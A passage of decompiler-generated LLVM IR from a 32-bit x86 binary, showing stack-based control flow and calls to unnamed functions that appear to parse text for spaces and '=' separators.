  %v2_8049128 = inttoptr i32 %v1_8049128 to i32*
  store i32 40, i32* %v2_8049128, align 4
  %v3_804912a = call i32 @function_8051240(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_804912a, i32* %eax.global-to-local, align 4
  %v0_804912f = load i32, i32* @esp, align 4
  %v9_804912f = icmp eq i32 %v0_804912f, -12
  store i1 %v9_804912f, i1* %zf.global-to-local, align 1
  %v2_8049132 = add i32 %v0_804912f, 8
  %v3_8049132 = inttoptr i32 %v2_8049132 to i32*
  store i32 %v3_804912a, i32* %v3_8049132, align 4
  %v1_8049133 = add i32 %v0_804912f, 120
  %v2_8049133 = inttoptr i32 %v1_8049133 to i32*
  %v3_8049133 = load i32, i32* %v2_8049133, align 4
  store i32 %v3_8049133, i32* @edx, align 4
  %v2_8049137 = add i32 %v0_804912f, 4
  %v3_8049137 = inttoptr i32 %v2_8049137 to i32*
  store i32 %v3_8049133, i32* %v3_8049137, align 4
  %v1_8049138 = add i32 %v0_804912f, 147
  store i32 %v1_8049138, i32* %eax.global-to-local, align 4
  %v3_804913f = inttoptr i32 %v0_804912f to i32*
  store i32 %v1_8049138, i32* %v3_804913f, align 4
  %v4_8049140 = call i32 @function_8051f30(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049145 = load i32, i32* @esp, align 4
  %v1_8049148 = add i32 %v4_8049140, 1
  %v8_8049148 = icmp eq i32 %v1_8049148, 0
  store i1 %v8_8049148, i1* %zf.global-to-local, align 1
  store i32 %v1_8049148, i32* %eax.global-to-local, align 4
  br i1 %v8_8049148, label %dec_label_pc_8049a67, label %dec_label_pc_804914f

dec_label_pc_804914f:                             ; preds = %dec_label_pc_8049124
  %v2_804914f = add i32 %v0_8049145, 12
  %v3_804914f = inttoptr i32 %v2_804914f to i32*
  store i32 %v1_8049148, i32* %v3_804914f, align 4
  %v0_8049150 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049150 = add i32 %v0_8049145, 8
  %v3_8049150 = inttoptr i32 %v2_8049150 to i32*
  store i32 %v0_8049150, i32* %v3_8049150, align 4
  %v1_8049151 = add i32 %v0_8049145, 4
  %v2_8049151 = inttoptr i32 %v1_8049151 to i32*
  store i32 0, i32* %v2_8049151, align 4
  %v2_8049153 = inttoptr i32 %v0_8049145 to i32*
  store i32 40, i32* %v2_8049153, align 4
  %v3_8049155 = call i32 @function_8051240(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049155, i32* %eax.global-to-local, align 4
  %v0_804915a = load i32, i32* @esp, align 4
  %v9_804915a = icmp eq i32 %v0_804915a, -12
  store i1 %v9_804915a, i1* %zf.global-to-local, align 1
  %v2_804915d = add i32 %v0_804915a, 8
  %v3_804915d = inttoptr i32 %v2_804915d to i32*
  store i32 %v3_8049155, i32* %v3_804915d, align 4
  %v1_804915e = add i32 %v0_804915a, 120
  %v2_804915e = inttoptr i32 %v1_804915e to i32*
  %v3_804915e = load i32, i32* %v2_804915e, align 4
  store i32 %v3_804915e, i32* %eax.global-to-local, align 4
  %v2_8049162 = add i32 %v0_804915a, 4
  %v3_8049162 = inttoptr i32 %v2_8049162 to i32*
  store i32 %v3_804915e, i32* %v3_8049162, align 4
  %v1_8049163 = add i32 %v0_804915a, 147
  store i32 %v1_8049163, i32* @edx, align 4
  %v3_804916a = inttoptr i32 %v0_804915a to i32*
  store i32 %v1_8049163, i32* %v3_804916a, align 4
  %v4_804916b = call i32 @function_8051f30(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804916b, i32* %eax.global-to-local, align 4
  %v0_8049170 = load i32, i32* @esp, align 4
  %v6_8049170 = icmp eq i32 %v0_8049170, -16
  store i1 %v6_8049170, i1* %zf.global-to-local, align 1
  store i32 %v4_804916b, i32* %ebx.global-to-local, align 4
  %v2_8049175 = add i32 %v4_804916b, 147
  %v3_8049175 = add i32 %v2_8049175, %v0_8049170
  %v4_8049175 = inttoptr i32 %v3_8049175 to i8*
  %v5_8049175 = load i8, i8* %v4_8049175, align 1
  %v11_8049175 = icmp eq i8 %v5_8049175, 32
  %v1_804917d = zext i1 %v11_8049175 to i32
  %v1_8049180 = add i32 %v0_8049170, 147
  store i32 %v1_8049180, i32* %esi.global-to-local, align 4
  store i32 %v1_804917d, i32* %eax.global-to-local, align 4
  %v1_804918c = add i32 %v0_8049170, 12
  %v2_804918c = inttoptr i32 %v1_804918c to i32*
  store i32 2, i32* %v2_804918c, align 4
  %v1_804918e = add i32 %v0_8049170, 8
  %v2_804918e = inttoptr i32 %v1_804918e to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b06.10 to i32), i32* %v2_804918e, align 4
  %v0_8049193 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049193 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049193 = add i32 %v1_8049193, %v0_8049193
  store i32 %v2_8049193, i32* @ebx, align 4
  %v1_8049195 = add i32 %v0_8049170, 120
  %v2_8049195 = inttoptr i32 %v1_8049195 to i32*
  %v3_8049195 = load i32, i32* %v2_8049195, align 4
  %v2_8049199 = sub i32 %v3_8049195, %v2_8049193
  store i32 %v2_8049199, i32* %eax.global-to-local, align 4
  %v0_804919b = load i32, i32* %esi.global-to-local, align 4
  %v2_804919b = add i32 %v0_804919b, %v2_8049193
  %v12_804919b = icmp eq i32 %v2_804919b, 0
  store i1 %v12_804919b, i1* %zf.global-to-local, align 1
  store i32 %v2_804919b, i32* @esi, align 4
  %v2_804919d = add i32 %v0_8049170, 4
  %v3_804919d = inttoptr i32 %v2_804919d to i32*
  store i32 %v2_8049199, i32* %v3_804919d, align 4
  %v0_804919e = load i32, i32* @esi, align 4
  %v3_804919e = inttoptr i32 %v0_8049170 to i32*
  store i32 %v0_804919e, i32* %v3_804919e, align 4
  %v0_804919f = call i32 @function_8051cf0()
  store i32 %v0_804919f, i32* %eax.global-to-local, align 4
  %v0_80491a4 = load i32, i32* @esp, align 4
  store i32 %v0_804919f, i32* %edx.global-to-local, align 4
  %v10_80491a9 = icmp eq i32 %v0_804919f, -1
  store i1 %v10_80491a9, i1* %zf.global-to-local, align 1
  br i1 %v10_80491a9, label %dec_label_pc_80491db, label %dec_label_pc_80491ae

dec_label_pc_80491ae:                             ; preds = %dec_label_pc_804914f
  %v10_80491ae = icmp eq i32 %v0_804919f, 1
  store i1 %v10_80491ae, i1* %zf.global-to-local, align 1
  %v7_80491b1 = icmp sgt i32 %v0_804919f, 1
  br i1 %v7_80491b1, label %dec_label_pc_80491b3, label %dec_label_pc_80491b6

dec_label_pc_80491b3:                             ; preds = %dec_label_pc_80491ae
  %v1_80491b3 = add i32 %v0_804919f, -2
  %v9_80491b3 = icmp eq i32 %v1_80491b3, 0
  store i1 %v9_80491b3, i1* %zf.global-to-local, align 1
  store i32 %v1_80491b3, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80491b6

dec_label_pc_80491b6:                             ; preds = %dec_label_pc_80491ae, %dec_label_pc_80491b3
  %v1_80491bf = phi i32 [ %v0_804919f, %dec_label_pc_80491ae ], [ %v1_80491b3, %dec_label_pc_80491b3 ]
  %v1_80491b6 = add i32 %v0_80491a4, 20920
  %v1_80491bd = load i32, i32* @ebx, align 4
  %v2_80491bd = add i32 %v1_80491b6, %v1_80491bd
  %v12_80491bd = icmp eq i32 %v2_80491bd, 0
  store i1 %v12_80491bd, i1* %zf.global-to-local, align 1
  store i32 %v2_80491bd, i32* %eax.global-to-local, align 4
  %v2_80491bf = add i32 %v1_80491bf, -20773
  %v3_80491bf = add i32 %v2_80491bf, %v2_80491bd
  %v4_80491bf = inttoptr i32 %v3_80491bf to i8*
  store i8 0, i8* %v4_80491bf, align 1
  %v0_80491c7 = load i32, i32* %eax.global-to-local, align 4
  %v1_80491c7 = load i32, i32* @esp, align 4
  %v2_80491c7 = add i32 %v1_80491c7, -4
  %v3_80491c7 = inttoptr i32 %v2_80491c7 to i32*
  store i32 %v0_80491c7, i32* %v3_80491c7, align 4
  %v0_80491c8 = load i32, i32* %eax.global-to-local, align 4
  %v2_80491c8 = add i32 %v1_80491c7, -8
  %v3_80491c8 = inttoptr i32 %v2_80491c8 to i32*
  store i32 %v0_80491c8, i32* %v3_80491c8, align 4
  %v1_80491c9 = add i32 %v1_80491c7, -12
  %v2_80491c9 = inttoptr i32 %v1_80491c9 to i32*
  store i32 10, i32* %v2_80491c9, align 4
  %v0_80491cb = load i32, i32* @esi, align 4
  %v2_80491cb = add i32 %v1_80491c7, -16
  %v3_80491cb = inttoptr i32 %v2_80491cb to i32*
  store i32 %v0_80491cb, i32* %v3_80491cb, align 4
  %v3_80491cc = call i32 @function_8051d40(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80491cc, i32* %eax.global-to-local, align 4
  %v0_80491d1 = load i32, i32* @esp, align 4
  %v1_80491d1 = add i32 %v0_80491d1, 108
  %v2_80491d1 = inttoptr i32 %v1_80491d1 to i32*
  %v3_80491d1 = load i32, i32* %v2_80491d1, align 4
  store i32 %v3_80491d1, i32* %ecx.global-to-local, align 4
  %v6_80491d5 = icmp eq i32 %v0_80491d1, -16
  store i1 %v6_80491d5, i1* %zf.global-to-local, align 1
  %v2_80491d8 = add i32 %v3_80491d1, 12
  %v3_80491d8 = inttoptr i32 %v2_80491d8 to i32*
  store i32 %v3_80491cc, i32* %v3_80491d8, align 4
  br label %dec_label_pc_80491db

dec_label_pc_80491db:                             ; preds = %dec_label_pc_804914f, %dec_label_pc_8049a67, %dec_label_pc_80491b6
  store i1 true, i1* %zf.global-to-local, align 1
  %v1_80491e0.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80491e0

dec_label_pc_80491e0:                             ; preds = %dec_label_pc_8049301, %dec_label_pc_80491db
  %v1_80491e0 = phi i32 [ %v1_80491e0.pre, %dec_label_pc_80491db ], [ %v0_8049301, %dec_label_pc_8049301 ]
  %storemerge6 = phi i32 [ 0, %dec_label_pc_80491db ], [ %v3_8049301, %dec_label_pc_8049301 ]
  store i32 %storemerge6, i32* @esi, align 4
  %v0_80491e0 = load i32, i32* %eax.global-to-local, align 4
  %v2_80491e0 = add i32 %v1_80491e0, -4
  %v3_80491e0 = inttoptr i32 %v2_80491e0 to i32*
  store i32 %v0_80491e0, i32* %v3_80491e0, align 4
  %v0_80491e1 = load i32, i32* %eax.global-to-local, align 4
  %v2_80491e1 = add i32 %v1_80491e0, -8
  %v3_80491e1 = inttoptr i32 %v2_80491e1 to i32*
  store i32 %v0_80491e1, i32* %v3_80491e1, align 4
  %v1_80491e2 = add i32 %v1_80491e0, -12
  %v2_80491e2 = inttoptr i32 %v1_80491e2 to i32*
  store i32 0, i32* %v2_80491e2, align 4
  %v1_80491e4 = add i32 %v1_80491e0, -16
  %v2_80491e4 = inttoptr i32 %v1_80491e4 to i32*
  store i32 39, i32* %v2_80491e4, align 4
  %v3_80491e6 = call i32 @function_8051240(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80491e6, i32* %eax.global-to-local, align 4
  %v0_80491eb = load i32, i32* @esp, align 4
  %v1_80491eb = add i32 %v0_80491eb, 147
  %v1_80491f5 = load i32, i32* @esi, align 4
  %v2_80491f5 = add i32 %v1_80491eb, %v1_80491f5
  %v12_80491f5 = icmp eq i32 %v2_80491f5, 0
  store i1 %v12_80491f5, i1* %zf.global-to-local, align 1
  store i32 %v2_80491f5, i32* @ebx, align 4
  %v2_80491f7 = add i32 %v0_80491eb, 8
  %v3_80491f7 = inttoptr i32 %v2_80491f7 to i32*
  store i32 %v3_80491e6, i32* %v3_80491f7, align 4
  %v1_80491f8 = add i32 %v0_80491eb, 120
  %v2_80491f8 = inttoptr i32 %v1_80491f8 to i32*
  %v3_80491f8 = load i32, i32* %v2_80491f8, align 4
  store i32 %v3_80491f8, i32* @ebp, align 4
  %v2_80491fc = add i32 %v0_80491eb, 4
  %v3_80491fc = inttoptr i32 %v2_80491fc to i32*
  store i32 %v3_80491f8, i32* %v3_80491fc, align 4
  %v0_80491fd = load i32, i32* @ebx, align 4
  %v3_80491fd = inttoptr i32 %v0_80491eb to i32*
  store i32 %v0_80491fd, i32* %v3_80491fd, align 4
  %v4_80491fe = call i32 @function_8051f30(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049203 = load i32, i32* @esp, align 4
  %v1_8049206 = add i32 %v4_80491fe, 1
  %v8_8049206 = icmp eq i32 %v1_8049206, 0
  store i1 %v8_8049206, i1* %zf.global-to-local, align 1
  store i32 %v1_8049206, i32* %eax.global-to-local, align 4
  br i1 %v8_8049206, label %dec_label_pc_80493d2, label %dec_label_pc_804920d

dec_label_pc_804920d:                             ; preds = %dec_label_pc_80491e0
  %v1_804920d = add i32 %v0_8049203, 108
  %v2_804920d = inttoptr i32 %v1_804920d to i32*
  %v3_804920d = load i32, i32* %v2_804920d, align 4
  store i32 %v3_804920d, i32* %edx.global-to-local, align 4
  %v1_8049211 = add i32 %v3_804920d, 16
  %v2_8049211 = inttoptr i32 %v1_8049211 to i32*
  %v3_8049211 = load i32, i32* %v2_8049211, align 4
  %v4_8049211 = add i32 %v3_8049211, -4
  %v9_8049211 = sub i32 3, %v3_8049211
  %v10_8049211 = and i32 %v9_8049211, %v3_8049211
  %v11_8049211 = icmp slt i32 %v10_8049211, 0
  %v12_8049211 = icmp eq i32 %v4_8049211, 0
  store i1 %v12_8049211, i1* %zf.global-to-local, align 1
  %v13_8049211 = icmp slt i32 %v4_8049211, 0
  %v3_8049215 = icmp eq i1 %v13_8049211, %v11_8049211
  %v4_8049215 = icmp eq i1 %v12_8049211, false
  %v5_8049215 = and i1 %v4_8049215, %v3_8049215
  br i1 %v5_8049215, label %dec_label_pc_80493d2, label %dec_label_pc_804921b

dec_label_pc_804921b:                             ; preds = %dec_label_pc_804920d
  %v2_804921b = add i32 %v0_8049203, 12
  %v3_804921b = inttoptr i32 %v2_804921b to i32*
  store i32 %v1_8049206, i32* %v3_804921b, align 4
  %v0_804921c = load i32, i32* %eax.global-to-local, align 4
  %v2_804921c = add i32 %v0_8049203, 8
  %v3_804921c = inttoptr i32 %v2_804921c to i32*
  store i32 %v0_804921c, i32* %v3_804921c, align 4
  %v1_804921d = add i32 %v0_8049203, 4
  %v2_804921d = inttoptr i32 %v1_804921d to i32*
  store i32 0, i32* %v2_804921d, align 4
  %v2_804921f = inttoptr i32 %v0_8049203 to i32*
  store i32 39, i32* %v2_804921f, align 4
  %v3_8049221 = call i32 @function_8051240(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049221, i32* %eax.global-to-local, align 4
  %v0_8049226 = load i32, i32* @esp, align 4
  %v9_8049226 = icmp eq i32 %v0_8049226, -12
  store i1 %v9_8049226, i1* %zf.global-to-local, align 1
  %v2_8049229 = add i32 %v0_8049226, 8
  %v3_8049229 = inttoptr i32 %v2_8049229 to i32*
  store i32 %v3_8049221, i32* %v3_8049229, align 4
  %v1_804922a = add i32 %v0_8049226, 120
  %v2_804922a = inttoptr i32 %v1_804922a to i32*
  %v3_804922a = load i32, i32* %v2_804922a, align 4
  store i32 %v3_804922a, i32* %eax.global-to-local, align 4
  %v2_804922e = add i32 %v0_8049226, 4
  %v3_804922e = inttoptr i32 %v2_804922e to i32*
  store i32 %v3_804922a, i32* %v3_804922e, align 4
  %v0_804922f = load i32, i32* @ebx, align 4
  %v3_804922f = inttoptr i32 %v0_8049226 to i32*
  store i32 %v0_804922f, i32* %v3_804922f, align 4
  %v4_8049230 = call i32 @function_8051f30(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049230, i32* %eax.global-to-local, align 4
  %v0_8049235 = load i32, i32* @esi, align 4
  %v2_8049235 = add i32 %v0_8049235, %v4_8049230
  store i32 %v2_8049235, i32* %edx.global-to-local, align 4
  %v1_8049238 = load i32, i32* @esp, align 4
  %v2_8049238 = add i32 %v1_8049238, 124
  %v3_8049238 = inttoptr i32 %v2_8049238 to i32*
  store i32 %v2_8049235, i32* %v3_8049238, align 4
  %v0_804923c = load i32, i32* @esp, align 4
  %v1_804923c = add i32 %v0_804923c, 16
  %v6_804923c = icmp eq i32 %v1_804923c, 0
  store i1 %v6_804923c, i1* %zf.global-to-local, align 1
  %v1_804923f = load i32, i32* %edx.global-to-local, align 4
  %v2_804923f = add i32 %v0_804923c, 147
  %v3_804923f = add i32 %v2_804923f, %v1_804923f
  %v4_804923f = inttoptr i32 %v3_804923f to i8*
  %v5_804923f = load i8, i8* %v4_804923f, align 1
  %v11_804923f = icmp eq i8 %v5_804923f, 32
  store i1 %v11_804923f, i1* %zf.global-to-local, align 1
  br i1 %v11_804923f, label %dec_label_pc_804939a, label %dec_label_pc_804924d

dec_label_pc_804924d:                             ; preds = %dec_label_pc_804921b, %dec_label_pc_804939a
  %v0_8049256 = phi i32 [ %v1_804923c, %dec_label_pc_804921b ], [ %v0_804924d.pre, %dec_label_pc_804939a ]
  %v1_804924d = add i32 %v0_8049256, 104
  %v2_804924d = inttoptr i32 %v1_804924d to i32*
  %v3_804924d = load i32, i32* %v2_804924d, align 4
  %v0_8049251 = load i32, i32* @ebx, align 4
  %v1_8049251 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049251 = add i32 %v1_8049251, %v0_8049251
  store i32 %v2_8049251, i32* @ebp, align 4
  %v1_8049254 = load i32, i32* @esi, align 4
  %v2_8049254 = sub i32 %v3_804924d, %v1_8049254
  store i32 %v2_8049254, i32* %edi.global-to-local, align 4
  %v1_8049256 = add i32 %v0_8049256, -4
  %v2_8049256 = inttoptr i32 %v1_8049256 to i32*
  store i32 2, i32* %v2_8049256, align 4
  %v0_8049258 = load i32, i32* %edi.global-to-local, align 4
  %v1_8049258 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049258 = sub i32 %v0_8049258, %v1_8049258
  %v12_8049258 = icmp eq i32 %v2_8049258, 0
  store i1 %v12_8049258, i1* %zf.global-to-local, align 1
  store i32 %v2_8049258, i32* @edi, align 4
  %v1_804925a = add i32 %v0_8049256, -8
  %v2_804925a = inttoptr i32 %v1_804925a to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b06.10 to i32), i32* %v2_804925a, align 4
  %v0_804925f = load i32, i32* @edi, align 4
  %v2_804925f = add i32 %v0_8049256, -12
  %v3_804925f = inttoptr i32 %v2_804925f to i32*
  store i32 %v0_804925f, i32* %v3_804925f, align 4
  %v0_8049260 = load i32, i32* @ebp, align 4
  %v2_8049260 = add i32 %v0_8049256, -16
  %v3_8049260 = inttoptr i32 %v2_8049260 to i32*
  store i32 %v0_8049260, i32* %v3_8049260, align 4
  %v0_8049261 = call i32 @function_8051cf0()
  store i32 %v0_8049261, i32* %eax.global-to-local, align 4
  %v0_8049266 = load i32, i32* @esp, align 4
  %v1_8049266 = add i32 %v0_8049266, 16
  store i32 %v0_8049261, i32* @ebx, align 4
  %v10_804926b = icmp eq i32 %v0_8049261, -1
  store i1 %v10_804926b, i1* %zf.global-to-local, align 1
  br i1 %v10_804926b, label %dec_label_pc_8049301, label %dec_label_pc_8049274

dec_label_pc_8049274:                             ; preds = %dec_label_pc_804924d
  %v1_8049274 = add i32 %v0_8049266, 147
  store i32 %v1_8049274, i32* %esi.global-to-local, align 4
  %v1_804927b = add i32 %v0_8049266, 124
  %v2_804927b = inttoptr i32 %v1_804927b to i32*
  %v3_804927b = load i32, i32* %v2_804927b, align 4
  store i32 %v3_804927b, i32* %eax.global-to-local, align 4
  %v2_804927f = add i32 %v3_804927b, %v1_8049274
  store i32 %v2_804927f, i32* @esi, align 4
  %v10_8049281 = icmp eq i32 %v0_8049261, 1
  store i1 %v10_8049281, i1* %zf.global-to-local, align 1
  %v7_8049284 = icmp sgt i32 %v0_8049261, 1
  br i1 %v7_8049284, label %dec_label_pc_8049286, label %dec_label_pc_8049289

dec_label_pc_8049286:                             ; preds = %dec_label_pc_8049274
  %v1_8049286 = add i32 %v0_8049261, -2
  %v9_8049286 = icmp eq i32 %v1_8049286, 0
  store i1 %v9_8049286, i1* %zf.global-to-local, align 1
  store i32 %v1_8049286, i32* @ebx, align 4
  br label %dec_label_pc_8049289

dec_label_pc_8049289:                             ; preds = %dec_label_pc_8049274, %dec_label_pc_8049286
  %v1_8049289 = add i32 %v0_8049266, 12
  %v2_8049289 = inttoptr i32 %v1_8049289 to i32*
  store i32 1, i32* %v2_8049289, align 4
  %v1_804928b = add i32 %v0_8049266, 8
  %v2_804928b = inttoptr i32 %v1_804928b to i32*
  store i32 ptrtoint (i32* @global_var_8054b09.14 to i32), i32* %v2_804928b, align 4
  %v0_8049290 = load i32, i32* @edi, align 4
  %v2_8049290 = add i32 %v0_8049266, 4
  %v3_8049290 = inttoptr i32 %v2_8049290 to i32*
  store i32 %v0_8049290, i32* %v3_8049290, align 4
  %v0_8049291 = load i32, i32* @ebp, align 4
  %v3_8049291 = inttoptr i32 %v0_8049266 to i32*
  store i32 %v0_8049291, i32* %v3_8049291, align 4
  %v0_8049292 = call i32 @function_8051cf0()
  store i32 %v0_8049292, i32* %eax.global-to-local, align 4
  %v0_8049297 = load i32, i32* @esp, align 4
  %v1_804929a = icmp eq i32 %v0_8049292, 0
  store i1 %v1_804929a, i1* %zf.global-to-local, align 1
  %tmp143 = icmp slt i32 %v0_8049292, 1
  br i1 %tmp143, label %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge, label %dec_label_pc_804929e

dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge: ; preds = %dec_label_pc_8049289
  %v1_8049297 = add i32 %v0_8049297, 16
  %v1_80492bd.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80492b2

dec_label_pc_804929e:                             ; preds = %dec_label_pc_8049289
  %v1_804929e = add i32 %v0_8049297, 12
  %v2_804929e = inttoptr i32 %v1_804929e to i32*
  store i32 1, i32* %v2_804929e, align 4
  %v1_80492a0 = add i32 %v0_8049297, 8
  %v2_80492a0 = inttoptr i32 %v1_80492a0 to i32*
  store i32 ptrtoint (i32* @global_var_8054b09.14 to i32), i32* %v2_80492a0, align 4
  %v0_80492a5 = load i32, i32* @edi, align 4
  %v2_80492a5 = add i32 %v0_8049297, 4
  %v3_80492a5 = inttoptr i32 %v2_80492a5 to i32*
  store i32 %v0_80492a5, i32* %v3_80492a5, align 4
  %v0_80492a6 = load i32, i32* @ebp, align 4
  %v3_80492a6 = inttoptr i32 %v0_8049297 to i32*
  store i32 %v0_80492a6, i32* %v3_80492a6, align 4
  %v0_80492a7 = call i32 @function_8051cf0()
  store i32 %v0_80492a7, i32* %eax.global-to-local, align 4
  %v0_80492ac = load i32, i32* @esp, align 4
  %v1_80492ac = add i32 %v0_80492ac, 16
  %v6_80492ac = icmp eq i32 %v1_80492ac, 0
  store i1 %v6_80492ac, i1* %zf.global-to-local, align 1
  %v1_80492af = add i32 %v0_80492a7, -1
  store i32 %v1_80492af, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80492b2

dec_label_pc_80492b2:                             ; preds = %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge, %dec_label_pc_804929e
  %v1_80492bd = phi i32 [ %v1_80492bd.pre, %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge ], [ %v1_80492af, %dec_label_pc_804929e ]
  %v0_80492bf = phi i32 [ %v1_8049297, %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge ], [ %v1_80492ac, %dec_label_pc_804929e ]
  %v1_80492b2 = add i32 %v0_80492bf, 20904
  store i32 %v1_80492b2, i32* %eax.global-to-local, align 4
  %v1_80492b9 = add i32 %v0_80492bf, 108
  %v2_80492b9 = inttoptr i32 %v1_80492b9 to i32*
  %v3_80492b9 = load i32, i32* %v2_80492b9, align 4
  store i32 %v3_80492b9, i32* %edx.global-to-local, align 4
  %v2_80492bd = add i32 %v1_80492b2, %v1_80492bd
  %v12_80492bd = icmp eq i32 %v2_80492bd, 0
  store i1 %v12_80492bd, i1* %zf.global-to-local, align 1
  store i32 %v2_80492bd, i32* %eax.global-to-local, align 4
  %v1_80492bf = add i32 %v0_80492bf, 20900
  %v2_80492bf = inttoptr i32 %v1_80492bf to i32*
  store i32 0, i32* %v2_80492bf, align 4
  %v0_80492ca = load i32, i32* %eax.global-to-local, align 4
  %v1_80492ca = load i32, i32* %edx.global-to-local, align 4
  %v2_80492ca = add i32 %v0_80492ca, -20773
  %v3_80492ca = add i32 %v2_80492ca, %v1_80492ca
  %v4_80492ca = inttoptr i32 %v3_80492ca to i8*
  store i8 0, i8* %v4_80492ca, align 1
  br label %dec_label_pc_80492e4

dec_label_pc_80492d4:                             ; preds = %dec_label_pc_80492e4
  br i1 %v13_80492d4, label %dec_label_pc_804930a, label %dec_label_pc_80492da

dec_label_pc_80492da:                             ; preds = %dec_label_pc_80492d4
  %v1_80492da = add i32 %v3_80492ed, 1
  store i32 %v1_80492da, i32* %eax.global-to-local, align 4
  store i32 %v1_80492da, i32* %v2_80492ed, align 4
  br label %dec_label_pc_80492e4

dec_label_pc_80492e4:                             ; preds = %dec_label_pc_80492b2, %dec_label_pc_80492da
  %v0_80492e4 = load i32, i32* @esp, align 4
  %v9_80492e4 = icmp eq i32 %v0_80492e4, 12
  store i1 %v9_80492e4, i1* %zf.global-to-local, align 1
  %v0_80492e7 = load i32, i32* @esi, align 4
  %v2_80492e7 = add i32 %v0_80492e4, -16
  %v3_80492e7 = inttoptr i32 %v2_80492e7 to i32*
  store i32 %v0_80492e7, i32* %v3_80492e7, align 4
  %v2_80492e8 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_80492e8, i32* %eax.global-to-local, align 4
  %v0_80492ed = load i32, i32* @esp, align 4
  %v1_80492ed = add i32 %v0_80492ed, 20916
  %v2_80492ed = inttoptr i32 %v1_80492ed to i32*
  %v3_80492ed = load i32, i32* %v2_80492ed, align 4
  store i32 %v3_80492ed, i32* @ebx, align 4
  %v2_80492f7 = sub i32 %v2_80492e8, %v3_80492ed
  %v8_80492f7 = xor i32 %v3_80492ed, %v2_80492e8
  %v9_80492f7 = xor i32 %v2_80492f7, %v2_80492e8
  %v10_80492f7 = and i32 %v9_80492f7, %v8_80492f7
  %v11_80492f7 = icmp slt i32 %v10_80492f7, 0
  %v12_80492f7 = icmp eq i32 %v2_80492f7, 0
  store i1 %v12_80492f7, i1* %zf.global-to-local, align 1
  %v13_80492f7 = icmp slt i32 %v2_80492f7, 0
  %v3_80492f9 = icmp eq i1 %v13_80492f7, %v11_80492f7
  %v4_80492f9 = icmp eq i1 %v12_80492f7, false
  %v5_80492f9 = and i1 %v4_80492f9, %v3_80492f9
  %v0_80492d4 = load i32, i32* @esi, align 4
  %v2_80492d4 = add i32 %v0_80492d4, %v3_80492ed
  %v3_80492d4 = inttoptr i32 %v2_80492d4 to i8*
  %v4_80492d4 = load i8, i8* %v3_80492d4, align 1
  %v13_80492d4 = icmp eq i8 %v4_80492d4, 61
  store i1 %v13_80492d4, i1* %zf.global-to-local, align 1
  br i1 %v5_80492f9, label %dec_label_pc_80492d4, label %dec_label_pc_80492fb

dec_label_pc_80492fb:                             ; preds = %dec_label_pc_80492e4
  %v1_80492f4 = add i32 %v0_80492ed, 16
  br i1 %v13_80492d4, label %dec_label_pc_804930a, label %dec_label_pc_8049301

dec_label_pc_8049301:                             ; preds = %dec_label_pc_8049322, %dec_label_pc_8049358, %dec_label_pc_80492fb, %dec_label_pc_804924d, %dec_label_pc_8049369
  %v0_8049301 = phi i32 [ %v1_8049361, %dec_label_pc_8049358 ], [ %v1_80492f4, %dec_label_pc_80492fb ], [ %v1_8049266, %dec_label_pc_804924d ], [ %v0_8049301.pre, %dec_label_pc_8049369 ], [ %v1_8049339, %dec_label_pc_8049322 ]
  %v1_8049301 = add i32 %v0_8049301, 108
  %v2_8049301 = inttoptr i32 %v1_8049301 to i32*
  %v3_8049301 = load i32, i32* %v2_8049301, align 4
  br label %dec_label_pc_80491e0

dec_label_pc_804930a:                             ; preds = %dec_label_pc_80492d4, %dec_label_pc_80492fb
  %v1_804930a = add i32 %v0_80492ed, 108
  %v2_804930a = inttoptr i32 %v1_804930a to i32*
  %v3_804930a = load i32, i32* %v2_804930a, align 4
  store i32 %v3_804930a, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %v2_80492ed, align 4
  %v0_8049319 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049319 = add i32 %v0_8049319, 16
  %v2_8049319 = inttoptr i32 %v1_8049319 to i32*
  %v3_8049319 = load i32, i32* %v2_8049319, align 4
  %v1_804931c = icmp eq i32 %v3_8049319, 0
  store i1 %v1_804931c, i1* %zf.global-to-local, align 1
  %tmp144 = icmp slt i32 %v3_8049319, 1
  br i1 %tmp144, label %dec_label_pc_8049358, label %dec_label_pc_8049320

dec_label_pc_8049320:                             ; preds = %dec_label_pc_804930a
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049322

dec_label_pc_8049322:                             ; preds = %dec_label_pc_8049340, %dec_label_pc_8049320
  %v0_8049322 = phi i32 [ %v4_8049353, %dec_label_pc_8049340 ], [ 0, %dec_label_pc_8049320 ]
  %v2_8049322 = mul i32 %v0_8049322, 128
  %v3_8049322 = icmp eq i32 %v2_8049322, 0
  store i1 %v3_8049322, i1* %zf.global-to-local, align 1
  store i32 %v2_8049322, i32* %eax.global-to-local, align 4
  %v0_8049325 = load i32, i32* @edi, align 4
  %v1_8049325 = load i32, i32* @esp, align 4
